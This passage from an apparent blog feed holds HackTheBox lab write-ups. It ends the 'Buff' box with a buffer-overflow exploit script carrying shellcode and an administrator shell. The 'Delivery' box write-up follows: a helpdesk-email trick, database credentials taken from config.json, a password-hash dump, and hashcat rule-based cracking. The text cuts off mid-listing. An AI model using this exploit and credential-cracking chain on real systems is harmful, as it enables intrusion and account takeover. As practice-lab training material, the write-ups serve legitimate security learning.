<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/buff<span class="comment"># cat buff.py </span></span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"></span><br><span class="line">padding1   = b<span class="string">&quot;\x90&quot;</span> * 1052</span><br><span class="line">EIP        = b<span class="string">&quot;\xB5\x42\xA8\x68&quot;</span> <span class="comment"># 0x68A842B5 -&gt; PUSH ESP, RET</span></span><br><span class="line">NOPS       = b<span class="string">&quot;\x90&quot;</span> * 30</span><br><span class="line"></span><br><span class="line"><span class="comment">#msfvenom -a x86 -p windows/exec CMD=calc.exe -b &#x27;\x00\x0A\x0D&#x27; -f python</span></span><br><span class="line">payload =  b<span class="string">&quot;&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\xba\xd7\xda\x14\xc1\xdb\xcd\xd9\x74\x24\xf4\x58&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x31\xc9\xb1\x3e\x31\x50\x15\x83\xc0\x04\x03\x50&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x11\xe2\x22\x26\xfc\x43\xcc\xd7\xfd\x23\x45\x32&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\xcc\x63\x31\x36\x7f\x54\x32\x1a\x8c\x1f\x16\x8f&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x07\x6d\xbe\xa0\xa0\xd8\x98\x8f\x31\x70\xd8\x8e&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\xb1\x8b\x0c\x71\x8b\x43\x41\x70\xcc\xbe\xab\x20&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x85\xb5\x19\xd5\xa2\x80\xa1\x5e\xf8\x05\xa1\x83&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x49\x27\x80\x15\xc1\x7e\x02\x97\x06\x0b\x0b\x8f&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x4b\x36\xc2\x24\xbf\xcc\xd5\xec\xf1\x2d\x79\xd1&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x3d\xdc\x80\x15\xf9\x3f\xf7\x6f\xf9\xc2\x0f\xb4&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x83\x18\x9a\x2f\x23\xea\x3c\x94\xd5\x3f\xda\x5f&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\xd9\xf4\xa9\x38\xfe\x0b\x7e\x33\xfa\x80\x81\x94&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x8a\xd3\xa5\x30\xd6\x80\xc4\x61\xb2\x67\xf9\x72&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x1d\xd7\x5f\xf8\xb0\x0c\xd2\xa3\xde\xd3\x61\xde&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\xad\xd4\x79\xe1\x81\xbc\x48\x6a\x4e\xba\x55\xb9&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x2a\x34\x1c\xe0\x1b\xdd\xf8\x70\x1e\x80\xfb\xae&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x5d\xbd\x7f\x5b\x1e\x3a\x9f\x2e\x1b\x06\x18\xc2&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x51\x17\xcc\xe4\xc6\x18\xc5\xa6\xd2\xba\x9d\x49&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x4e\x33\x2d\xd6\xf8\xc7\xa9\x89\x9b\x54\x6d\x31&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x25\xf6\xd1\xc8\xa5\x64\x86\x53\x22\x29\x36\xf7&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x84\xb4\xbe\x92\xf8\x1b\x5b\x7d\x9a\x0e\xc7\x53&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x39\xa9\x62\x8c\xf0\x79\x42\xfd\xc2\x57\xab\xca&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x0c\x9a\xfa\x02\x71\xed\xcc\x5d\x49\x11&quot;</span></span><br><span class="line">overrun    = b<span class="string">&quot;C&quot;</span> * (1500 - len(padding1 + NOPS + EIP + payload))</span><br><span class="line"></span><br><span class="line">buf = padding1 + EIP + NOPS + payload + overrun </span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((target,8888))</span><br><span class="line">        s.send(buf)</span><br><span class="line">except Exception as e:</span><br><span class="line">        <span class="built_in">print</span>(sys.exc_value)</span><br><span class="line">root@JIYE:~/htb/buff<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><code>kaliç›‘å¬ç«¯å£</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 7078</span></span><br><span class="line">listening on [any] 7078 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>æ‰§è¡Œbuff.pyåˆ©ç”¨</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/buff<span class="comment"># python3 buff.py</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 7078</span></span><br><span class="line">listening on [any] 7078 ...</span><br><span class="line">connect to [10.10.17.216] from (UNKNOWN) [10.10.10.198] 50209</span><br><span class="line">Microsoft Windows [Version 10.0.17134.1610]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">buff\administrator</span><br></pre></td></tr></table></figure>

<p><code>ææƒå®Œæˆï¼Œå¯»æ‰¾root.txt</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop&gt;<span class="built_in">type</span> root.txt</span><br><span class="line"><span class="built_in">type</span> root.txt</span><br><span class="line">af0c7f7eef091d9e4b4cd0f0e88268c9</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-[delivery]</title>
    <url>/2021/02/04/HTB-delivery/</url>
    <content><![CDATA[<h2 id="0x00-ç®€è¿°"><a href="#0x00-ç®€è¿°" class="headerlink" title="0x00.ç®€è¿°"></a>0x00.ç®€è¿°</h2><img src="/2021/02/04/HTB-delivery/image-20210203224703300.png" class>

<a id="more"></a>

<h2 id="0x01-ä¿¡æ¯æ”¶é›†"><a href="#0x01-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x01.ä¿¡æ¯æ”¶é›†"></a>0x01.ä¿¡æ¯æ”¶é›†</h2><p><code>åªå¼€æ”¾äº†22ä¸80ç«¯å£</code></p>
<blockquote>
<p>æ·»åŠ ä¸¤æ¡hostsæ–‡ä»¶</p>
<p>10.10.10.222    helpdesk.delivery.htb<br>10.10.10.222    delivery.htb</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/delivery# nmap -sC -sV -sT 10.10.10.222 -oN nmap.CVT</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-03 16:27 EST</span><br><span class="line">Nmap scan report for helpdesk.delivery.htb (10.10.10.222)</span><br><span class="line">Host is up (0.34s latency).</span><br><span class="line">Not shown: 965 closed ports, 33 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)</span><br><span class="line">|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)</span><br><span class="line">|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.14.2</span><br><span class="line">|_http-server-header: nginx/1.14.2</span><br><span class="line">|_http-title: delivery</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 100.17 seconds</span><br><span class="line">root@JIYE:~/htb/delivery#</span><br></pre></td></tr></table></figure>

<h2 id="0x02-è®¿é—®80ç«¯å£"><a href="#0x02-è®¿é—®80ç«¯å£" class="headerlink" title="0x02.è®¿é—®80ç«¯å£"></a>0x02.è®¿é—®80ç«¯å£</h2><p><code>å‘ç°äºé‚®ä»¶ç›¸å…³</code></p>
<img src="/2021/02/04/HTB-delivery/image-20210203225046353.png" class>

<p><code>æ‰‹åŠ¨çˆ¬è™«å‘ç°ä¸¤ä¸ªæœ‰ç”¨é“¾æ¥å¦‚ä¸‹</code></p>
<blockquote>
<p>ç¬¬ä¸€ä¸ªä¸ºä¸€ä¸ªè®¡ç¥¨ç³»ç»Ÿ</p>
</blockquote>
<img src="/2021/02/04/HTB-delivery/image-20210203225320648.png" class>

<blockquote>
<p>ç¬¬äºŒä¸ªä¸ºæä¾›MatterMostæœåŠ¡</p>
</blockquote>
<img src="/2021/02/04/HTB-delivery/image-20210203225437119.png" class>

<blockquote>
<p>ç‚¹å‡»MatterMost serverè·³è½¬åˆ°å¦‚ä¸‹é¡µé¢ï¼Œå¯ä»¥ç™»å…¥æ³¨å†Œ</p>
</blockquote>
<img src="/2021/02/04/HTB-delivery/image-20210203225641859.png" class>

<h2 id="0x03-æäº¤è¡¨å•è¿›è¡Œæµ‹è¯•"><a href="#0x03-æäº¤è¡¨å•è¿›è¡Œæµ‹è¯•" class="headerlink" title="0x03.æäº¤è¡¨å•è¿›è¡Œæµ‹è¯•"></a>0x03.æäº¤è¡¨å•è¿›è¡Œæµ‹è¯•</h2><p><code>æäº¤</code></p>
<img src="/2021/02/04/HTB-delivery/image-20210203225931140.png" class>

<p><code>å¾—åˆ°ticket id 6285564ä¸é‚®ç®±6285564@delivery.htb</code></p>
<img src="/2021/02/04/HTB-delivery/image-20210203230847316.png" class>

<p><code>æäº¤å®Œæˆä¹‹åå¯ä»¥è¿›è¡ŒçŠ¶æ€æŸ¥è¯¢</code></p>
<img src="/2021/02/04/HTB-delivery/image-20210203231322565.png" class>

<p><code>å¯ä»¥çœ‹åˆ°çŠ¶æ€å¦‚ä¸‹</code></p>
<img src="/2021/02/04/HTB-delivery/image-20210203231357635.png" class>

<h2 id="0x04-é‚®ç®±åˆ©ç”¨MasterMost"><a href="#0x04-é‚®ç®±åˆ©ç”¨MasterMost" class="headerlink" title="0x04.é‚®ç®±åˆ©ç”¨MasterMost"></a>0x04.é‚®ç®±åˆ©ç”¨MasterMost</h2><p><code>ä½¿ç”¨6285564@delivery.htbæ³¨å†ŒMasterMost</code></p>
<img src="/2021/02/04/HTB-delivery/image-20210203231611322.png" class>

<p><code>å†æ¬¡æŸ¥çœ‹çŠ¶æ€ï¼Œå¯ä»¥çœ‹åˆ°åˆšåˆšçš„é‚®ä»¶æ¿€æ´»è¿æ¥</code></p>
<img src="/2021/02/04/HTB-delivery/image-20210203231908206.png" class>

<h2 id="0x05-æ¿€æ´»ç™»å…¥"><a href="#0x05-æ¿€æ´»ç™»å…¥" class="headerlink" title="0x05.æ¿€æ´»ç™»å…¥"></a>0x05.æ¿€æ´»ç™»å…¥</h2><p><code>ç‚¹å‡»å¦‚ä¸‹è¿æ¥</code></p>
<blockquote>
<p><span class="exturl" data-url="aHR0cDovL2RlbGl2ZXJ5Lmh0Yjo4MDY1L2RvX3ZlcmlmeV9lbWFpbD90b2tlbj1qb3JwMWtrZnJxaGtneDl3b3FhM3o5ZGszM2h3aHhyaGhvem9uMXNzdW10dGplcHA2bW1iOHE5OWF5aXQ4aWRxJmFtcDtlbWFpbD02Mjg1NTY0QGRlbGl2ZXJ5Lmh0Yg==">http://delivery.htb:8065/do_verify_email?token=jorp1kkfrqhkgx9woqa3z9dk33hwhxrhhozon1ssumttjepp6mmb8q99ayit8idq&amp;email=6285564%40delivery.htb<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<img src="/2021/02/04/HTB-delivery/image-20210203232040991.png" class>

<p><code>åŠ å…¥å›¢é˜Ÿ</code></p>
<img src="/2021/02/04/HTB-delivery/image-20210203232228472.png" class>

<p><code>å¾—åˆ°ç”¨æˆ·åä¸å¯†ç </code></p>
<blockquote>
<p>maildeliverer:Youve_G0t_Mail! </p>
</blockquote>
<img src="/2021/02/04/HTB-delivery/image-20210203232549365.png" class>

<p><code>ç™»å…¥å¾—åˆ°flag</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~# ssh maildeliverer@10.10.10.222</span><br><span class="line">The authenticity of host &#x27;10.10.10.222 (10.10.10.222)&#x27; can&#x27;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:LKngIDlEjP2k8M7IAUkAoFgY/MbVVbMqvrFA6CUrHoM.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;10.10.10.222&#x27; (ECDSA) to the list of known hosts.</span><br><span class="line">maildeliverer@10.10.10.222&#x27;s password: </span><br><span class="line">Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64</span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Wed Feb  3 10:27:44 2021 from 10.10.14.55</span><br><span class="line">maildeliverer@Delivery:~$ ls</span><br><span class="line">user.txt</span><br><span class="line">maildeliverer@Delivery:~$ cat user.txt </span><br><span class="line">******************************</span><br><span class="line">maildeliverer@Delivery:~$</span><br></pre></td></tr></table></figure>

<h2 id="0x06-ææƒ"><a href="#0x06-ææƒ" class="headerlink" title="0x06.ææƒ"></a>0x06.ææƒ</h2><p><code>è¿™é‡ŒæŸ¥çœ‹rootè¯´çš„ä¸¤å¥è¯</code></p>
<blockquote>
<p>ç¬¬ä¸€ä¸ªå¯èƒ½å­˜åœ¨ä¸PleaseSubscribe!ç±»ä¼¼çš„å¯†ç </p>
</blockquote>
<img src="/2021/02/04/HTB-delivery/image-20210203234447237.png" class>

<blockquote>
<p>ç¬¬äºŒä¸ªå¯ä»¥ä½¿ç”¨hashcatï¼Œè¿›è¡Œç±»å‹å¯†ç çš„æšä¸¾ã€‚</p>
<p>æç¤ºäº†è¿™ä¹ˆå¤šï¼Œå¯ä»¥å¼€æäº†ã€‚</p>
</blockquote>
<img src="/2021/02/04/HTB-delivery/image-20210203234610886.png" class>

<p><code>æŸ¥çœ‹mattermostçš„é…ç½®æ–‡ä»¶</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">maildeliverer@Delivery:/tmp$ find / -name mattermost &gt; list</span><br><span class="line">maildeliverer@Delivery:/tmp$ cat list </span><br><span class="line">/opt/mattermost</span><br><span class="line">/opt/mattermost/bin/mattermost</span><br><span class="line">/var/lib/mysql/mattermost</span><br></pre></td></tr></table></figure>

<p><code>æœ€ç»ˆæ‰¾åˆ°é…ç½®æ–‡ä»¶ä½ç½®</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">maildeliverer@Delivery:/opt/mattermost/config$ ls</span><br><span class="line">cloud_defaults.json  config.json  README.md</span><br></pre></td></tr></table></figure>

<p><code>æ‰¾åˆ°æ•°æ®åº“çš„é…ç½®æ–‡ä»¶å¦‚ä¸‹</code></p>
<blockquote>
<p>æ•°æ®åº“ä¸ºmysql</p>
<p>ç”¨æˆ·åä¸å¯†ç ä¸ºmmuser:Crack_The_MM_Admin_PW</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&quot;SqlSettings&quot;: &#123;</span><br><span class="line">        &quot;DriverName&quot;: &quot;mysql&quot;,</span><br><span class="line">        &quot;DataSource&quot;: &quot;mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s&quot;,</span><br><span class="line">        &quot;DataSourceReplicas&quot;: [],</span><br><span class="line">        &quot;DataSourceSearchReplicas&quot;: [],</span><br><span class="line">        &quot;MaxIdleConns&quot;: 20,</span><br><span class="line">        &quot;ConnMaxLifetimeMilliseconds&quot;: 3600000,</span><br><span class="line">        &quot;MaxOpenConns&quot;: 300,</span><br><span class="line">        &quot;Trace&quot;: false,</span><br><span class="line">        &quot;AtRestEncryptKey&quot;: &quot;n5uax3d4f919obtsp1pw1k5xetq1enez&quot;,</span><br><span class="line">        &quot;QueryTimeout&quot;: 30,</span><br><span class="line">        &quot;DisableDatabaseSearch&quot;: false</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure>

<p><code>ç™»å…¥æ•°æ®åº“ï¼ŒæŸ¥è¯¢æ•°æ®</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">maildeliverer@Delivery:~$ mysql -ummuser -pCrack_The_MM_Admin_PW</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection id is 3173</span><br><span class="line">Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; show databses;</span><br><span class="line">ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;databses&#x27; at line 1</span><br><span class="line">MariaDB [(none)]&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mattermost         |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows in set (0.000 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; use mattermost</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">MariaDB [mattermost]&gt; show tables;</span><br><span class="line">+------------------------+</span><br><span class="line">| Tables_in_mattermost   |</span><br><span class="line">+------------------------+</span><br><span class="line">| Audits                 |</span><br><span class="line">| Bots                   |</span><br><span class="line">| ChannelMemberHistory   |</span><br><span class="line">| ChannelMembers         |</span><br><span class="line">| Channels               |</span><br><span class="line">| ClusterDiscovery       |</span><br><span class="line">| CommandWebhooks        |</span><br><span class="line">| Commands               |</span><br><span class="line">| Compliances            |</span><br><span class="line">| Emoji                  |</span><br><span class="line">| FileInfo               |</span><br><span class="line">| GroupChannels          |</span><br><span class="line">| GroupMembers           |</span><br><span class="line">| GroupTeams             |</span><br><span class="line">| IncomingWebhooks       |</span><br><span class="line">| Jobs                   |</span><br><span class="line">| Licenses               |</span><br><span class="line">| LinkMetadata           |</span><br><span class="line">| OAuthAccessData        |</span><br><span class="line">| OAuthApps              |</span><br><span class="line">| OAuthAuthData          |</span><br><span class="line">| OutgoingWebhooks       |</span><br><span class="line">| PluginKeyValueStore    |</span><br><span class="line">| Posts                  |</span><br><span class="line">| Preferences            |</span><br><span class="line">| ProductNoticeViewState |</span><br><span class="line">| PublicChannels         |</span><br><span class="line">| Reactions              |</span><br><span class="line">| Roles                  |</span><br><span class="line">| Schemes                |</span><br><span class="line">| Sessions               |</span><br><span class="line">| SidebarCategories      |</span><br><span class="line">| SidebarChannels        |</span><br><span class="line">| Status                 |</span><br><span class="line">| Systems                |</span><br><span class="line">| TeamMembers            |</span><br><span class="line">| Teams                  |</span><br><span class="line">| TermsOfService         |</span><br><span class="line">| ThreadMemberships      |</span><br><span class="line">| Threads                |</span><br><span class="line">| Tokens                 |</span><br><span class="line">| UploadSessions         |</span><br><span class="line">| UserAccessTokens       |</span><br><span class="line">| UserGroups             |</span><br><span class="line">| UserTermsOfService     |</span><br><span class="line">| Users                  |</span><br><span class="line">+------------------------+</span><br><span class="line">46 rows in set (0.000 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [mattermost]&gt; desc Users;</span><br><span class="line">+--------------------+--------------+------+-----+---------+-------+</span><br><span class="line">| Field              | Type         | Null | Key | Default | Extra |</span><br><span class="line">+--------------------+--------------+------+-----+---------+-------+</span><br><span class="line">| Id                 | varchar(26)  | NO   | PRI | NULL    |       |</span><br><span class="line">| CreateAt           | bigint(20)   | YES  | MUL | NULL    |       |</span><br><span class="line">| UpdateAt           | bigint(20)   | YES  | MUL | NULL    |       |</span><br><span class="line">| DeleteAt           | bigint(20)   | YES  | MUL | NULL    |       |</span><br><span class="line">| Username           | varchar(64)  | YES  | UNI | NULL    |       |</span><br><span class="line">| Password           | varchar(128) | YES  |     | NULL    |       |</span><br><span class="line">| AuthData           | varchar(128) | YES  | UNI | NULL    |       |</span><br><span class="line">| AuthService        | varchar(32)  | YES  |     | NULL    |       |</span><br><span class="line">| Email              | varchar(128) | YES  | UNI | NULL    |       |</span><br><span class="line">| EmailVerified      | tinyint(1)   | YES  |     | NULL    |       |</span><br><span class="line">| Nickname           | varchar(64)  | YES  |     | NULL    |       |</span><br><span class="line">| FirstName          | varchar(64)  | YES  |     | NULL    |       |</span><br><span class="line">| LastName           | varchar(64)  | YES  |     | NULL    |       |</span><br><span class="line">| Position           | varchar(128) | YES  |     | NULL    |       |</span><br><span class="line">| Roles              | text         | YES  |     | NULL    |       |</span><br><span class="line">| AllowMarketing     | tinyint(1)   | YES  |     | NULL    |       |</span><br><span class="line">| Props              | text         | YES  |     | NULL    |       |</span><br><span class="line">| NotifyProps        | text         | YES  |     | NULL    |       |</span><br><span class="line">| LastPasswordUpdate | bigint(20)   | YES  |     | NULL    |       |</span><br><span class="line">| LastPictureUpdate  | bigint(20)   | YES  |     | NULL    |       |</span><br><span class="line">| FailedAttempts     | int(11)      | YES  |     | NULL    |       |</span><br><span class="line">| Locale             | varchar(5)   | YES  |     | NULL    |       |</span><br><span class="line">| Timezone           | text         | YES  |     | NULL    |       |</span><br><span class="line">| MfaActive          | tinyint(1)   | YES  |     | NULL    |       |</span><br><span class="line">| MfaSecret          | varchar(128) | YES  |     | NULL    |       |</span><br><span class="line">+--------------------+--------------+------+-----+---------+-------+</span><br><span class="line">25 rows in set (0.001 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [mattermost]&gt; select Username,Password from Users;</span><br><span class="line">+----------------------------------+--------------------------------------------------------------+</span><br><span class="line">| Username                         | Password                                                     |</span><br><span class="line">+----------------------------------+--------------------------------------------------------------+</span><br><span class="line">| maninblack                       | $2a$10$EZnqACQzX8r.zHknpNnkj./4k4mWuBjfSphErBWULxjsXfUWmAwpC |</span><br><span class="line">| julius                           | $2a$10$he/ux5bbTQD9LHn.vdENBOFxZHViVBtu7y2Op4p81WjE8xfx.lgh6 |</span><br><span class="line">| demoo                            | $2a$10$mL83nl2BtSHwKw.whyR.ie.MA2URC4IM3N52rqAtvpwKTfIBSmQrK |</span><br><span class="line">| surveybot                        |                                                              |</span><br><span class="line">| test123                          | $2a$10$45ov3fMA1FUZJBxh1qlqSuy0TZlnBJ5tcx2HCIZI3eULPltoPrgQq |</span><br><span class="line">| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |</span><br><span class="line">| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |</span><br><span class="line">| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |</span><br><span class="line">| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |</span><br><span class="line">| tvfarrugia                       | $2a$10$o6yxtpE/NKKwAoDDmhvlYOFKQYeFpiaZzdXm9cngdLybreqIyNiC2 |</span><br><span class="line">| channelexport                    |                                                              |</span><br><span class="line">| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |</span><br><span class="line">| tvfarrugia123                    | $2a$10$1ons3/hCS7HSaQvz2xUWTOIzIbEdz.F8RA5XzhBov2f8QlyhkHm9W |</span><br><span class="line">| qqq                              | $2a$10$HyASuwVYXhyUrD6hItnA4u4xFoHsZ8umKx3NmtmxzNZb/8krIrirG |</span><br><span class="line">| demo                             | $2a$10$GFyQMEbrkoWZ19WrFN6blu.eoniX0Lm44bMGkfhNSEiU.Lt.vAwcC |</span><br><span class="line">+----------------------------------+--------------------------------------------------------------+</span><br><span class="line">15 rows in set (0.000 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [mattermost]&gt;</span><br></pre></td></tr></table></figure>

<p><code>å¾—åˆ°rootç”¨æˆ·å¯†ç çš„hashå€¼</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">2a<span class="variable">$10</span><span class="variable">$VM6EeymRxJ29r8Wjkr8Dtev0O</span>.1STWb4.4ScG.anuu7v0EFJwgjjO</span></span><br></pre></td></tr></table></figure>

<p><code>ç”Ÿæˆå®šåˆ¶å­—å…¸</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/delivery# hashcat -r /usr/share/hashcat/rules/best64.rule --stdout rule.txt &gt; word.list</span><br><span class="line">root@JIYE:~/htb/delivery# wc -l word.list </span><br><span class="line">77 word.list</span><br><span class="line">root@JIYE:~/htb/delivery# cat rule.txt </span><br><span class="line">PleaseSubscribe!</span><br><span class="line">root@JIYE:~/htb/delivery#</span><br></pre></td></tr></table></figure>

<p><code>ç¢°æ’</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/delivery# hashcat -h | grep &quot;crypt&quot;</span><br><span class="line">     --truecrypt-keyfiles       | File | Keyfiles to use, separated with commas               | --truecrypt-keyf=x.png</span><br><span class="line">     --veracrypt-keyfiles       | File | Keyfiles to use, separated with commas               | --veracrypt-keyf=x.txt</span><br><span class="line">     --veracrypt-pim-start      | Num  | VeraCrypt personal iterations multiplier start       | --veracrypt-pim-start=450</span><br><span class="line">     --veracrypt-pim-stop       | Num  | VeraCrypt personal iterations multiplier stop        | --veracrypt-pim-stop=500</span><br><span class="line">     --scrypt-tmto              | Num  | Manually override TMTO value for scrypt to X         | --scrypt-tmto=3</span><br><span class="line">   8900 | scrypt                                           | Generic KDF</span><br><span class="line">   3200 | bcrypt $2*$, Blowfish (Unix)                     | Operating System</span><br><span class="line">    500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)        | Operating System</span><br><span class="line">   1500 | descrypt, DES (Unix), Traditional DES            | Operating System</span><br><span class="line">   7400 | sha256crypt $5$, SHA256 (Unix)                   | Operating System</span><br><span class="line">   1800 | sha512crypt $6$, SHA512 (Unix)                   | Operating System</span><br><span class="line">   9300 | Cisco-IOS $9$ (scrypt)                           | Operating System</span><br><span class="line">  15100 | Juniper/NetBSD sha1crypt                         | Operating System</span><br><span class="line">   7401 | MySQL $A$ (sha256crypt)                          | Database Server</span><br><span class="line">  12200 | eCryptfs                                         | Full-Disk Encryption (FDE)</span><br><span class="line">  22400 | AES Crypt (SHA256)                               | Full-Disk Encryption (FDE)</span><br><span class="line">  14600 | LUKS                                             | Full-Disk Encryption (FDE)</span><br><span class="line">  13711 | VeraCrypt RIPEMD160 + XTS 512 bit                | Full-Disk Encryption (FDE)</span><br><span class="line">  13712 | VeraCrypt RIPEMD160 + XTS 1024 bit               | Full-Disk Encryption (FDE)</span><br><span class="line">  13713 | VeraCrypt RIPEMD160 + XTS 1536 bit               | Full-Disk Encryption (FDE)</span><br><span class="line">  13741 | VeraCrypt RIPEMD160 + XTS 512 bit + boot-mode    | Full-Disk Encryption (FDE)</span><br><span class="line">  13742 | VeraCrypt RIPEMD160 + XTS 1024 bit + boot-mode   | Full-Disk Encryption (FDE)</span><br><span class="line">  13743 | VeraCrypt RIPEMD160 + XTS 1536 bit + boot-mode   | Full-Disk Encryption (FDE)</span><br><span class="line">  13751 | VeraCrypt SHA256 + XTS 512 bit                   | Full-Disk Encryption (FDE)</span><br><span class="line">  13752 | VeraCrypt SHA256 + XTS 1024 bit                  | Full-Disk Encryption (FDE)</span><br><span class="line">  13753 | VeraCrypt SHA256 + XTS 1536 bit                  | Full-Disk Encryption (FDE)</span><br><span class="line">  13761 | VeraCrypt SHA256 + XTS 512 bit + boot-mode       | Full-Disk Encryption (FDE)</span><br><span class="line">  13762 | VeraCrypt SHA256 + XTS 1024 bit + boot-mode      | Full-Disk Encryption (FDE)</span><br><span class="line">  13763 | VeraCrypt SHA256 + XTS 1536 bit + boot-mode      | Full-Disk 